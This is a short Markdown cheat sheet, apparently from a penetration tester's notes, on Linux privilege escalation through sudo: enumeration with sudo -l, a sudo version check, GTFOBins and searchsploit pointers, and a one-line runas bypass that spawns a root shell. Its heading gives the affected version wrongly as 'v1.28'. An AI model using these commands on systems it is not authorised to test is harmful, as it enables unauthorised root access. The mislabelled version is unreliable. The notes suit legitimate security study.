---
id: User Privileges
aliases: []
tags: []
---

# User Privileges

## Sudo

### Sudo commands

Check which commands the current user may run

```sh
sudo -l
```

Run command as `user`

```sh
sudo -u user /bin/echo Hello World!
```

The found command(s) may be exploited with [GTFOBins](https://gtfobins.github.io/)

### Sudo version

Check sudo version for vulnerabilities

```sh
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo vulnerabilities

Search Sudo version for public exploits

#### Searchsploit

```sh
searchsploit sudo
```

#### Sudo < v1.28

Run sudo

```sh
sudo -u#-1 /bin/bash
```
